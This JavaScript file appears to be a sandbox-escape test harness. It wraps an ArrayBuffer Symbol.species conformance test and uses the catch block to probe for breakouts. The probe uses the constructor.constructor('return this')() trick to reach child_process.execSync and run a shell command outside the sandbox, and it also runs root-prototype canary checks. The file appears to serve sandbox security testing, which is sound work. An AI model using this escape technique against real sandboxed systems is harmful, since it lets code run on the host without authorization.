try {
    var speciesConstructor = {};
    var arrayBuffer = new ArrayBuffer(8);
    arrayBuffer.constructor = speciesConstructor;
    function callSlice() {
        arrayBuffer.slice();
    }
    speciesConstructor[Symbol.species] = true;
    assert.throws(TypeError, callSlice, '`constructor[Symbol.species]` value is Boolean');
    speciesConstructor[Symbol.species] = '';
    assert.throws(TypeError, callSlice, '`constructor[Symbol.species]` value is String');
    speciesConstructor[Symbol.species] = Symbol();
    assert.throws(TypeError, callSlice, '`constructor[Symbol.species]` value is Symbol');
    speciesConstructor[Symbol.species] = 1;
    assert.throws(TypeError, callSlice, '`constructor[Symbol.species]` value is Number');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}